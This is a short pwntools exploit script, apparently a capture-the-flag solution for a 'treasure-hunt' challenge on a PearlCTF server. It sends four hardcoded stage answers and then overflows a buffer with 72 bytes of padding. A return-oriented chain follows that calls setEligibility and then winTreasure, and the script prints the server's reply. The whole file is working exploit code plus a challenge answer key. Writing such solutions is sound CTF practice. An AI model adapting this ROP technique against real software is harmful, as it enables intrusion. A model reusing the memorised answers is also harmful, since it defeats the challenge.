from pwn import *
elf = context.binary = ELF("./vuln")
p = remote("treasure-hunt.ctf.pearlctf.in",30008)
win = 'winTreasure'
eligible = "setEligibility"
rop = ROP(context.binary)
offset = 72
ret = 0x000000000040101a
p.sendline("whisp3ring_w00ds")
p.sendline("sc0rching_dunes")
p.sendline("eldorian_ech0")
p.sendline("shadow_4byss")
rop.raw(b"A" * offset)
rop.raw(ret)
rop.raw(elf.sym[eligible])
rop.raw(ret)
rop.raw(elf.sym[win])
p.sendline(rop.chain())
write("payload",rop.chain())
print(rop.dump())
print(p.recvall())
